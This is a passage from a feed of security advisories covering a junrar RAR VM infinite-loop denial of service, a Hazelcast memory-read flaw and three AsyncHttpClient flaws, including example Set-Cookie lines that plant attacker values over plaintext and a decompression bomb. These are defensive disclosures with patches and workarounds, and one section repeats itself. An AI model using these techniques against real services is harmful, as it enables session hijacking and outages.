private boolean setIP(int ip) {
    if ((ip) >= codeSize) {
        return (true);
    }

    if (--maxOpCount <= 0) {
        return (false);
    }

    IP = ip;
    return true;
}

When ip >= codeSize, this branch:

  • does not update IP;
  • does not decrement maxOpCount;
  • returns true, so callers treat it as success.

The VM_JMP handler and the other jump-like handlers discard the return value of setIP() and immediately continue the main VM loop:

case VM_JMP:
    setIP(getValue(false, mem, op1));
    continue;

Because of the continue, execution also skips the loop-end accounting:

IP++;
--maxOpCount;

As a result, a VM program containing a single VM_JMP instruction can freeze both IP and maxOpCount:

  1. IP points to the VM_JMP instruction.
  2. The jump target resolves to codeSize or larger.
  3. setIP() returns before modifying IP or decrementing maxOpCount.
  4. The caller ignores the return value and continues.
  5. The same VM_JMP instruction is executed again forever.

Impact

This is a CPU denial of service vulnerability. Any application that uses junrar to extract untrusted RAR archives can have an extraction worker thread permanently blocked by a small crafted archive. In services that process uploads or attachments automatically, repeated submissions can exhaust worker capacity and degrade or stop archive-processing functionality.

The RAR VM does not provide native code execution, reflection, or process execution primitives, and Java array bounds checks prevent escaping the VM memory array. The expected security impact is availability only.

References

  • https://github.com/junrar/junrar/security/advisories/GHSA-h9h9-2rmf-rvhp
  • https://github.com/junrar/junrar/commit/687a09c42f46066447faa9179ee11314ad6d9afb
  • https://github.com/junrar/junrar/releases/tag/v7.6.1
  • https://github.com/advisories/GHSA-h9h9-2rmf-rvhp

entry.title: [com.hazelcast:hazelcast] Hazelcast allows arbitrary member memory access by low-privileged client
entry.content:
Impact

A flaw has been found in Hazelcast Enterprise Edition and Community Edition, which would allow a low-privileged malicious client to read arbitrary data in memory from any cluster member (including Java heap memory, off-heap data, and JVM process address space). Additionally, such a client may be able to cause one or more cluster members to crash, or in some Enterprise Edition configurations also corrupt memory contents, potentially leading to remote code execution. Both slim and full distributions are affected.

Patches

Enterprise customers should upgrade to a fixed version of Hazelcast Enterprise Edition:

  • 5.7.0
  • 5.6.1
  • 5.5.10
  • 5.4.5

Customers with extended support contracts should contact Hazelcast Support for information on patches for older versions.

Community Edition users should upgrade to version 5.7.0.

Hazelcast also recommends all customers follow the advice in our Security Hardening guide, including:

  • Ensure Hazelcast Security is enabled and client authorization is enforced.
  • Define an explicit allowlist for zero config Compact serialization.
  • Avoid deploying clients on internet-facing non-secure networks or non-secure hosts.
  • Ensure your Hazelcast cluster is appropriately protected by firewall rules.
  • Disable any features you are not using.

Workarounds

If you cannot update to a fixed version immediately, restrict cluster access to trusted clients only and ensure clients are hardened against compromise.

References

entry.title: [org.asynchttpclient:async-http-client] AsyncHttpClient CookieStore Silently Overrides Caller's Explicit Cookie Header via setHeader (Bypass of CVE-2024-53990 Fix)
entry.content:
Impact

With the cookie store enabled, which is the default, a Cookie header that the caller sets on a request with setHeader or addHeader is thrown away whenever the store holds any cookie for the request's origin: the request's cookie list is written into that header afterwards and replaces it. CVE-2024-53990 fixed the same problem for cookies added with addCookie, but that fix works on the cookie list, and a header set directly never reaches it.

This is not limited to a cookie of the same name. A store cookie of any name erases the caller's header, so a request meant to carry the caller's session cookie goes out with only the store's cookies, and where the store has a cookie of the caller's name, the store's value is sent instead.

It matters most where one client acts for several users. An application that puts each user's session on the request itself, and shares one client and its default cookie store, sends one user's request with a session cookie the store took from a response to another user. The request runs as that other user, so a user of such an application can have their request served under someone else's session, or someone else's under theirs.

Affected versions

  • 3.x: up to and including 3.0.13
  • 2.x: from 2.1.0 up to and including 2.16.1

Patches

Fixed in 3.0.14. The store's cookies are added to a caller's Cookie header instead of replacing it, and where both name the same cookie the caller's is kept. The caller's text is kept as written, and several Cookie headers are folded into one, as RFC 6265 Section 5.4 requires.

The 2.x line is end of life and will not receive a fix. Upgrade to 3.0.14.

Workarounds

Where requests carry per-user cookies, use a separate client per user, or disable the cookie store with setCookieStore(null).

References

Incomplete fix of CVE-2024-53990 (GHSA-mfj5-cf8g-g2fv). Reported by @1diot9.

Attribution

AI-assisted tools were used to support discovery and analysis.

References

  • https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-2jwh-9rmr-j4xf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-107228
  • https://github.com/AsyncHttpClient/async-http-client/commit/fd9763620725126c1c8bb0af1ceb9a7523099a5f
  • https://github.com/AsyncHttpClient/async-http-client/releases/tag/async-http-client-project-3.0.14

  • 2.x: from 2.1.0 up to and including 2.16.1

Fixed in 3.0.14. The store's cookies are added to a caller's Cookie header instead of replacing it, and where both name the same cookie the caller's is kept. The caller's text is kept as written, and several Cookie headers are folded into one, as RFC 6265 Section 5.4 requires.

The 2.x line is end of life and will not receive a fix. Upgrade to 3.0.14.

Workarounds

Where requests carry per-user cookies, use a separate client per user, or disable the cookie store with setCookieStore(null).

Incomplete fix of CVE-2024-53990 (GHSA-mfj5-cf8g-g2fv). Reported by @1diot9.

entry.title: [org.asynchttpclient:async-http-client] AsyncHttpClient: Cookies received over plaintext HTTP can plant, overwrite or delete Secure cookies set over HTTPS
entry.content:
Impact

The cookie store ignores the scheme a Set-Cookie arrived on. draft-ietf-httpbis-rfc6265bis-22 (approved to obsolete RFC 6265, in the RFC Editor queue) Section 5.7 requires a user agent to ignore a cookie with the Secure attribute unless it arrived over a secure connection (step 13), and to ignore a non-Secure cookie from an insecure connection when it would overlay a Secure cookie the store already holds (step 16). Neither rule is implemented. The only Secure handling is on retrieval, where a Secure cookie is not sent over plaintext.

So anyone who can answer a plaintext request to a site can set, replace or delete the site's Secure cookies, and the next HTTPS request carries the attacker's value back inside TLS:

http://example.com   ->  Set-Cookie: SID=attacker-value; Secure; Path=/
https://example.com  ->  Cookie: SID=attacker-value

This does not need an attacker on the network path. A plaintext host under the same site reaches the HTTPS one by setting a domain cookie:

http://insecure.example.com  ->  Set-Cookie: SID=attacker-value; Secure; Domain=example.com; Path=/
https://bank.example.com     ->  Cookie: SID=attacker-value

A plaintext Set-Cookie of the same name, domain and path overwrites a Secure cookie, and one with Max-Age=0 deletes it. Depending on what the application does with the cookie, this is session fixation into the HTTPS session, an overwritten CSRF token, or the removal of a cookie the site relies on. Unlike GHSA-qjr7-w8pj-pmv9, which can only add a cookie, this replaces or deletes one, hence Integrity: High; the harm lands on the HTTPS site, hence Scope: Changed.

Affected versions

  • 3.x: up to and including 3.0.13
  • 2.x: from 2.1.0, when the cookie store was introduced, up to and including 2.16.1

Patches

Fixed in 3.0.14 on the 3.x line. A cookie with the Secure attribute is ignored unless the request was secure, and a non-Secure cookie from a request that did not use TLS is ignored when it would overlay a Secure cookie of the same name whose path its own path falls under. A plaintext response can therefore no longer plant, overwrite or delete a Secure cookie.

When several cookies of one name match a request, the client sends only the first, so the order in which the store returns them decides which one is used. That order is now: on a secure request, cookies received in a secure context (HTTPS, WSS or plaintext loopback) first; then the request host's own cookies before cookies set for a parent domain; then, within one host, longer paths first. A plaintext attacker cannot outrank a cookie the site set over HTTPS by ordering or padding its own cookies, or by setting one before the site sets its own.

Plaintext requests to localhost, or to an address literal that is a loopback address, count as secure, so a development server that sets Secure cookies over http://localhost gets them back. This is limited to the cookies such a server set itself: a Secure cookie that arrived over HTTPS is never sent over plaintext, loopback included, and a plaintext loopback port cannot overlay it. Numeric spellings that are not address literals, such as 127.0.0.256, and names under localhost are not treated as loopback, because the client resolves them as names.

The 2.x line is end of life and will not receive a fix. Upgrade to 3.0.14.

Workarounds

Do not share one CookieStore between plaintext and HTTPS origins that are not mutually trusted, including hosts under the same site. Disabling the cookie store also avoids it.

Details

ThreadSafeCookieStore.add(Uri, Cookie) reduces the request to its host and path before storing, so the scheme never reaches the code that decides whether to keep a cookie. get(Uri) does read it, but only to leave Secure cookies out of plaintext requests.

A narrower form survives the two storage rules on their own. The step 16 path test is one-way by design, so a plaintext SID for Path=/ is legitimately stored beside a Secure SID for Path=/account, and both match a request under /account. The store returned matching cookies in hash order, and the client keeps only the first cookie of each name when it builds the request (RequestBuilderBase.addCookieIfUnset), so an attacker could decide which one was sent, for example by padding one plaintext response with filler cookies. The ordering described above closes it.

The fix does not stop an HTTPS host under the same site from setting a domain cookie for a name the request host never sets itself. Only a __Host- cookie name prefix prevents that, and the client does not enforce cookie name prefixes.

entry.title: [org.asynchttpclient:async-http-client] AsyncHttpClient: Unbounded WebSocket permessage-deflate decompression enables a decompression-bomb denial of service when compression is enabled
entry.content:
Impact

With WebSocket compression enabled, the client inflates permessage-deflate messages with no limit on the decompressed size. It installed Netty's shared WebSocketClientCompressionHandler.INSTANCE, whose inflater is unbounded, and webSocketMaxFrameSize and webSocketMaxBufferSize only bound the compressed bytes, because the frame aggregator sits in front of the inflater.

A malicious or compromised WebSocket server, or anyone on the path of a ws:// connection, can therefore send a message of about 2 MiB that inflates to about 2 GiB, the most a Netty buffer can hold. The client then copies the inflated message again to hand it to the listener. That exhausts the heap of a typically sized JVM. Netty catches the resulting OutOfMemoryError and closes that connection, but while the buffer is live any other allocation in the process can fail too, and a server that keeps sending such messages, on one connection or several, keeps the client at heap exhaustion.

Who is Impacted

Only applications that enable WebSocket compression with setEnablewebSocketCompression(true), which is off by default, and connect to a WebSocket server that is untrusted, compromised, or reached over cleartext ws://.

Affected versions

  • 3.x: up to and including 3.0.13
  • 2.x: from 2.2.0, when WebSocket compression was added, up to and including 2.16.1

Patches

Fixed in 3.0.14. A new setting, webSocketMaxDecompressedFrameSize (setWebSocketMaxDecompressedFrameSize, or the org.asynchttpclient.webSocketMaxDecompressedFrameSize property), bounds how far a message may inflate, and a message that would go past it fails the connection. It defaults to 128000000 bytes, the same as webSocketMaxBufferSize, so a message is bounded alike whether or not it was compressed; a compressed message that inflates past that, which was accepted before, now fails the connection. With aggregateWebSocketFrameFragments turned off, the bound applies to each frame instead, and fragments are delivered one at a time. Set it lower if you enable compression and do not expect large messages. 0 disables the limit.

The 2.x line is end of life and will not receive a fix. Upgrade to 3.0.14.

Workarounds

Leave WebSocket compression disabled, which is the default.

Details

After the handshake the inbound pipeline is ws-decoder, ws-aggregator, PerMessageDeflateDecoder, ahc-ws: the aggregator, which enforces webSocketMaxBufferSize, sees each message before it is inflated. WebSocketClientCompressionHandler.INSTANCE is built with maxAllocation = 0, which Netty treats as unbounded, and Netty has deprecated it in favour of a constructor that takes a limit. RFC 6455 Section 10.4 asks an implementation to limit the size of a message after reassembly, and under RFC 7692 Section 6.2 the message delivered to the application is the decompressed payload.

This is a different path from the HTTP response decompression fixed under CVE-2026-85721, which never reached the WebSocket pipeline.
